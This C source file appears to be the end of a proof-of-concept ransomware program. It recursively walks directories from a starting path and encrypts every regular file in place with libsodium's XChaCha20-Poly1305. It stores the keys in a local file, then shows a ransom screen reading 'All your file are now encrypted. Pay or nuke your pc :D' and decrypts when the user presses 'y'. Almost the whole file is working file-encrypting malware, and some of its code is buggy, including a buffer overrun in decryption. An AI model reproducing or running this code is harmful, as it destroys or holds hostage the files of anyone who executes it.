"⠀⠀⠀⠀⠀⣀⠤⠤⠽⢭⠉⠉⠉⠀⠀⠀⢀⣴⠞⠋⠀⠀⣇⠀⠀⢿⠀⡀⣀⣨⣵⠞⠁⡀⠠⢼⣧⡦⠶⠖⠚⣻⠉⣼⢳⢋⡞⣱⣮⣶⡿⠋⢀⣧⡵⢻⠀⣧⣧⣶⣿⠿⠛⠋⠀⣰⣾⣿⢿⣿⡟⠀⢰⣿⠇⢻⣿⡄⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⣡⠚⡄⢃⠎⡑⠈⠆⡉⢆⠱⢠⠑⠄⢻⡵⢎⣞⢣⡗⡺⣖⡹⢆⡻⢄⠣⢾⡱\n"\
"⣀⠀⠠⢊⠉⠀⣀⣠⠖⢹⠆⠀⠀⢀⠠⢔⠛⠁⠀⠀⠀⠀⢻⠀⡀⢾⡈⣭⡵⢾⢥⠀⠐⠀⠀⢸⣆⣠⢴⣴⣫⣇⣼⣏⣴⡿⠿⠟⠛⠉⠀⠀⡏⠉⠉⢹⠀⠻⣿⡍⠤⠒⢀⣠⣾⣿⠏⢡⣾⠟⠀⢀⣿⡿⠀⢸⣿⣧⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⡡⢩⠄⠣⠘⠠⠈⠄⠁⠂⠈⠄⠊⠤⢉⡐⠂⣿⡹⣬⠳⡞⡵⣭⣹⠹⡜⡭⢊⡽⠀\n";

// func to return the last tab of the linked list
list_t	*list_last(list_t *lst)
{
	if (!lst)
		return (NULL);
	while (lst->next)
		lst = lst->next;
	return (lst);
}

// func to create a new tab for the linked list struct
list_t	*list_new(char *dir_path, unsigned char key[KEY_LEN],
					unsigned char header[HEADER_LEN])
{
	list_t	*cell;

	cell = (list_t *)malloc(sizeof(list_t));
	if (!cell)
		return (NULL);
	cell->dir_path = strdup(dir_path);
	memcpy(cell->key, key, KEY_LEN);
	memcpy(cell->header, header, HEADER_LEN);
	cell->next = NULL;
	return (cell);
}

// func to add a new tab at the end of the linked list
void	list_add(list_t **lst, list_t *new)
{
	list_t	*tmp;

	if (!lst)
		return ;
	if (!new)
		return ;
	tmp = list_last(*lst);
	if (!tmp)
		*lst = new;
	else
		tmp->next = new;
}

// func to free every list content
void list_free(list_t **lst)
{
    list_t *current;
    list_t *next;

    if (!lst || !*lst)
        return;

    current = *lst;
    while (current)
    {
        next = current->next;
        free(current->dir_path);
        free(current);
        current = next;
    }
    *lst = NULL;
}

list_t	*list_search_tab(list_t *list, char *path)
{
	while (list)
	{
		if (!strncmp(path, list->dir_path, strlen(path) + 1))
			break ;
		else
			list = list->next;
	}
	return (list);
}

// not secure way to store key I just use this one for the PoC 
void	write_key_to_file(list_t *list)
{
	close(open(KEYS_FILE, O_CREAT, 0777));
	int	fd = open(KEYS_FILE, O_WRONLY);

	while(list)
	{
		write(fd, list->dir_path, strlen(list->dir_path));
		write(fd, "\n", 1);
		write(fd, list->key, KEY_LEN);
		write(fd, list->header, HEADER_LEN);
		list = list->next;
	}
	close(fd);
}

// fill the linked list with stored data content
void	fill_key_from_file(list_t **list)
{
	int				fd;
	ssize_t			bytes;
	char			dir_buffer[BUFFER_SIZE];
	ssize_t			dir_len = 0;
	unsigned char	key[KEY_LEN];
	unsigned char	header[HEADER_LEN];
	char			ch;

	fd = open(KEYS_FILE, O_RDONLY);
	if (fd < 0)
		return;

	while((bytes = read(fd, &ch, 1)) == 1)
	{
		if (ch == '\n')
		{
			char *path = malloc(dir_len + 1);
			if (!path)
				break;
			memcpy(path, dir_buffer, dir_len);
			path[dir_len] = '\0';

			if (read(fd, key, KEY_LEN) != KEY_LEN)
			{
				free(path);
				break;
			}

			if (read(fd, header, HEADER_LEN) != HEADER_LEN)
			{
				free(path);
				break;
			}

			list_add(list, list_new(path, key, header));
			free(path);
			dir_len = 0;
			//memset(dir_buffer, 0, BUFFER_SIZE);
		}
		else if (dir_len < BUFFER_SIZE - 1)
			dir_buffer[dir_len++] = ch;
		else
			break ;
	}
	close(fd);
}

// return a malloc string of the whole file content
char	*read_whole_file(int fd, size_t *len)
{
	char	buffer[BUFFER_SIZE];
	char	*output = NULL;
	char	*temp;
	ssize_t	bytes_read;
	size_t	total_size = 0;

	while((bytes_read = read(fd, buffer, BUFFER_SIZE)) > 0)
	{
		temp = malloc(total_size + bytes_read + 1);
		if (!temp)
		{
			free(output);
			return (NULL);
		}
		if (output)
		{
			memcpy(temp, output, total_size);
			free(output);
		}
		memcpy(temp + total_size, buffer, bytes_read);
		total_size += bytes_read;
		temp[total_size] = '\0';
		output = temp;
	}
	if (bytes_read < 0)
	{
		free(output);
		return (NULL);
	}
	*len = total_size;
	return (output);
}

void	clear_file(int fd, char *file)
{
	fclose(fopen(file, "w"));
	lseek(fd, 0, SEEK_SET);
}

// func to encrypt and decrypt a file
void	encrypt(int fd, char *file, unsigned char key[KEY_LEN],
				 unsigned char header[HEADER_LEN], crypto_state state)
{
	unsigned char	*plaintext;
	size_t			len;

	plaintext = read_whole_file(fd, &len);
	if (!plaintext)
		return ;

	clear_file(fd, file);

	size_t cypher_len = len + crypto_secretstream_xchacha20poly1305_ABYTES;
	unsigned char *cypher = malloc(cypher_len * sizeof(unsigned char));

	crypto_secretstream_xchacha20poly1305_push(&state, cypher, NULL, plaintext,
										          len, NULL, 0, 0);
	write(fd, cypher, cypher_len);
	free(cypher);
	free(plaintext);
}

void	decrypt(int fd, char *file, unsigned char key[KEY_LEN],
				 unsigned char header[HEADER_LEN], crypto_state state)
{
	unsigned char	*plaintext;
	size_t			len;

	plaintext = read_whole_file(fd, &len);
	if (!plaintext)
		return ;

	clear_file(fd, file);

	size_t decypher_len = len - crypto_secretstream_xchacha20poly1305_ABYTES;
	unsigned char tag;
	unsigned char *message = malloc(decypher_len * sizeof(unsigned char));

	memset(message, 0, decypher_len);

	crypto_secretstream_xchacha20poly1305_pull(&state, message, NULL, &tag, plaintext, 
												len, NULL, 0);
	message[len] = 0;
	write(fd, message, decypher_len);
	free(message);
	free(plaintext);
}

char	*update_path(char *current_path, char *added_path)
{
	size_t len = strlen(current_path) + strlen(added_path) + 3;
	char *ret = malloc (len * sizeof(char));

	memset(ret, 0, len);
	strlcat(ret, current_path, strlen(current_path) + 1);
	if (strncmp(current_path, "/", 2))
		strlcat(ret, "/", strlen(ret) + 2);
	strlcat(ret, added_path, len);

	return (ret);
}

void	encrypt_file_handler(char *path, list_t **list)
{
	crypto_state	state;
	unsigned char	key[KEY_LEN];
	unsigned char	header[HEADER_LEN];
	DIR				*dir;
	struct dirent *restrict namelist;

	crypto_secretstream_xchacha20poly1305_keygen(key);
	crypto_secretstream_xchacha20poly1305_init_push(&state, header, key);

	list_add(list, list_new(path, key, header));

	dir = opendir(path);
	while (namelist = readdir(dir))
	{
		if (!strncmp(namelist->d_name, ".", 2) || !strncmp(namelist->d_name, "..", 3)) 
			continue ;
		if (namelist->d_type == DT_REG)
		{
			int fd;
			char *file = update_path(path, namelist->d_name);

			fd = open(file, O_RDWR);
			if (fd != -1)
			{
				encrypt(fd, file, key, header, state);
				close(fd);
			}
			free(file);
		}
		else if (namelist->d_type == DT_DIR)
		{
			char *new_path = update_path(path, namelist->d_name);
			encrypt_file_handler(new_path, list);
			free(new_path);
		}
	}
	closedir(dir);
}

void	decrypt_file_handler(char *path, list_t **list)
{
	crypto_state	state;
	DIR				*dir;
	struct dirent *restrict namelist;
	int				no_tab = 0;

	list_t *path_tab = list_search_tab(*list, path);
	if (!path_tab)
		no_tab = 1;

	crypto_secretstream_xchacha20poly1305_init_pull(&state, path_tab->header
													, path_tab->key);
	dir = opendir(path);
	while (namelist = readdir(dir))
	{
		//if (!strncmp(namelist->d_name, ".", 2) || !strncmp(namelist->d_name, "..", 3))
		if (!strncmp(namelist->d_name, ".", 2) || !strncmp(namelist->d_name, "..", 3) 
			|| !strncmp(namelist->d_name, "proc", 6) || !strncmp(namelist->d_name, "bin", 4))
			continue ;
		if (namelist->d_type == DT_REG && no_tab == 0)
		{
			int fd;
			char *file = update_path(path, namelist->d_name);

			fd = open(file, O_RDWR);
			if (fd != -1)
			{
				decrypt(fd, file, path_tab->key, path_tab->header, state);
				close(fd);
			}
			free(file);
		}
		else if (namelist->d_type == DT_DIR)
		{
			char *new_path = update_path(path, namelist->d_name);
			decrypt_file_handler(new_path, list);
			free(new_path);
		}
	}
	closedir(dir);
}

void	encrypt_handler(void)
{
	list_t	*list = NULL;

	encrypt_file_handler(STARTING_PATH, &list);
	write_key_to_file(list);

	list_free(&list);
}

void	decrypt_handler(void)
{
	list_t	*list = NULL;

	fill_key_from_file(&list);
	remove(KEYS_FILE);
	decrypt_file_handler(STARTING_PATH, &list);

	list_free(&list);
}

void	crypt_mode_handler(int mode)
{
	if (mode == ENCRYPT)
		encrypt_handler();
	else if (mode == DECRYPT)
		decrypt_handler();
	else
		return ;
}

void	clear_screen(void)
{
	write(STDIN_FILENO, "\x1b[2J", 4);
}

void	cursor_top(void)
{
	write(STDIN_FILENO, "\x1b[H", 3);
}

void	payement_screen(void)
{
	clear_screen();
	cursor_top();
	printf("%s\n\n\n\n\nAll your file are now encrypted."\
	"\n\nPay or nuke your pc :D\nPress y to pay : ", ascii_art);

	char c = getchar();
	printf("\n");
	
	if (c == 'y')
	{
		crypt_mode_handler(DECRYPT);
	//	clear_screen();
	}
	else
		payement_screen();
}

int	main(void)
{
	int fd;

	if (sodium_init() < 0)
		return(1);

	fd = open(KEYS_FILE, O_RDWR);
	if (fd == -1)
		crypt_mode_handler(ENCRYPT);
	else
		close(fd);

	payement_screen();

	return (0);
}
